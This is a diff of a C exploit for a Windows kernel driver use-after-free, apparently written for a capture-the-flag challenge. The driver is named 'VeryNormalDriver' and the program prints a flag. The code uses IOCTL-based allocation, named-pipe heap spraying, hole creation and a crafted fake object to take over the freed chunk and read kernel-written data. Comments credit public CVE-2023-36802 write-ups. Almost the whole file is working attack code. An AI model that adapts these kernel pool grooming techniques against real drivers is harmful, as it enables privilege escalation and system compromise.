@@ -1,31 +1,6 @@
-#include <iostream>
+#include <stdio.h>
 #include <Windows.h>
 #include <assert.h>
-
-#define IOCTL_COMMAND 0x80004
-#define IOCTL_ALLOC_POOL 0x80002000
-#define IOCTL_FREE_USER_CONTROLLED 0x80002004
-#define IOCTL_ALOC_PAGES 0x80002008
-#define IOCTL_IRQL 0x8000200c
-#define IOCTL_IRQL_SIMILAR 0x80002010
-#define IOCTL_READ_FILE 0x80002014
-
-
-VOID AllocateKernelObject(HANDLE hDriver) {
-    UINT8 buffer[512] = { 0 };
-    memset(buffer, 0x70, 512);
-    DWORD* bufferLength = (DWORD*)((buffer)+8);
-    DWORD targetLength = 0x78; // 0x68+0x38 = 160 decimal were getting B0
-    *bufferLength = targetLength;
-    BOOL result = DeviceIoControl(hDriver, 0x80002000, &buffer, 512, NULL, 0, NULL, NULL);
-    if (result) {
-        printf("Allocated Kernel Object \n", result);
-    }
-    else {
-        printf("Failed To Allocate Kernel Object \n", result);
-        exit(0);
-    }
-}
 
 typedef struct _IO_STATUS_BLOCK {
     union {
@@ -47,9 +22,25 @@ typedef NTSTATUS (*NtFsControlFile)(
     OUT PVOID               OutputBuffer OPTIONAL,
     IN ULONG                OutputBufferLength);
 
-// shout to https://medium.com/reverence-cyber/cve-2023-36802-mssksrv-sys-local-privilege-escalation-reverence-cyber-d54316eaf118
-// for the unbuffered pipe example below
 
+VOID AllocateKernelObject(HANDLE hDriver) {
+    UINT8 buffer[512] = { 0 };
+    memset(buffer, 0x70, 512); // <- so the driver doesnt remove it from the linkedlist creating a UAF
+    DWORD* bufferLength = (DWORD*)((buffer)+8);
+    DWORD targetLength = 0x78; // 0x68+0x38 = 160 decimal were getting B0
+    *bufferLength = targetLength;
+    BOOL result = DeviceIoControl(hDriver, 0x80002000, &buffer, 512, NULL, 0, NULL, NULL);
+    if (result) {
+    }
+    else {
+        printf("[-] Failed To Allocate Kernel Object \n");
+        exit(0);
+    }
+}
+
+// shout to https://medium.com/reverence-cyber/cve-2023-36802-mssksrv-sys-local-privilege-escalation-reverence-cyber-d54316eaf118
+// https://github.com/x0rb3l/CVE-2023-36802-MSKSSRV-LPE/tree/main
+// for the unbuffered pipe example below
 #define FSCTL_CODE 0x119ff8
 #define SPRAY_SIZE 0x10000
 #define PIPESPRAY_SIZE 0xC0
@@ -58,6 +49,8 @@ typedef NTSTATUS (*NtFsControlFile)(
 HANDLE phPipeHandleArray[sizeof(HANDLE) * SPRAY_SIZE];
 HANDLE phFileArray[sizeof(HANDLE) * SPRAY_SIZE];
 
+
+// Used to free the kernel objects
 void CreateHoles() {
     for (int i = 0; i < SPRAY_SIZE; i += 4)
     {
@@ -65,7 +58,6 @@ void CreateHoles() {
         CloseHandle(phFileArray[i]);
     }
 }
-
 
 VOID UnbufferedHeapSpray(void* data,int size) {
     IO_STATUS_BLOCK isb;
@@ -111,11 +103,8 @@ VOID UnbufferedHeapSpray(void* data,int size) {
             printf("[!] Error while calling NtFsControlFile: %p\n", ret);
             exit(1);
         }
-
         CloseHandle(ol.hEvent);
     }
-
-
 }
 
 typedef struct payload_t {
@@ -127,12 +116,11 @@ typedef struct payload_t {
     UINT64 Length;
 } PAYLOAD;
 
-int main(int argc, char** argv)
+int main()
 {
     printf("[+] Allocating Object\n");
     HANDLE hDriver = CreateFile(L"\\\\.\\VeryNormalDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hDriver == INVALID_HANDLE_VALUE) {
-        printf("failed to open driver %u\n", GetLastError());
         return -1;
     }
     AllocateKernelObject(hDriver);
@@ -142,16 +130,15 @@ int main(int argc, char** argv)
     void* data2 = VirtualAlloc(NULL, 0xB0, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     memset(data, 0x41, 0xB0);
     memset(data2, 0x0, 0xB0);
-    PAYLOAD p = {0};
-    p.Pid = GetCurrentProcessId();
-    p.ZeroIfFree = 0xFFFFFFFF;
+    PAYLOAD p = {0}; //
+    p.Pid = GetCurrentProcessId(); // <------------------------------------------------------ used so the driver associates with our same process.
+    p.ZeroIfFree = 0xFFFFFFFF; // <---------------------------------------------------------- used to bypass the read file check
     VOID* OurBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     memset(OurBuffer, 0x0, 0x1000);
-    p.MappedPagesAddress = (UINT64)OurBuffer;
+    p.MappedPagesAddress = (UINT64)OurBuffer; // <------------------------------------------- buffer in usermode that kernel will write flag to
     *(PAYLOAD*)data = p;
-    UnbufferedHeapSpray(data, 0xB0);
+    UnbufferedHeapSpray(data, 0xB0); // <---------------------------------------------------- spray Heap so it fills our hole
     printf("[+] Spraying heap!\n");
-    CreateHoles();
     printf("[+] Attempting to exploit the UAF now\n");
     hDriver = CreateFile(L"\\\\.\\VeryNormalDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hDriver == INVALID_HANDLE_VALUE) {
@@ -164,18 +151,19 @@ int main(int argc, char** argv)
 	DeviceIoControl(hDriver, 0x80002010, NULL, 0x0, NULL, 0, NULL, NULL);
 
     printf("[+] Flag %s\n", (char*)p.MappedPagesAddress);
-
     memset(&p, 0x0, sizeof(PAYLOAD));
     PAYLOAD p2 = { 0 };
+    p.Pid = -1;
     p2.Entry.Flink = (UINT64)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     p2.Entry.Blink = (UINT64)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     memset((VOID*)p2.Entry.Flink, 0x0, 0x1000);
+    memset((VOID*)p2.Entry.Blink, 0x0, 0x1000);
     *(PAYLOAD*)data2 = p2;
+    CreateHoles();
 	printf("[+] Refilling holes!\n");
     // refill the holes so we dont crash the machine
     UnbufferedHeapSpray(data2, 0xB0);
-    UnbufferedHeapSpray(data2, 0xB0);
-    UnbufferedHeapSpray(data2, 0xB0);
+	printf("[+] Hopefully we dont crash!\n");
 	printf("[+] Done!\n");
 
     return 0;
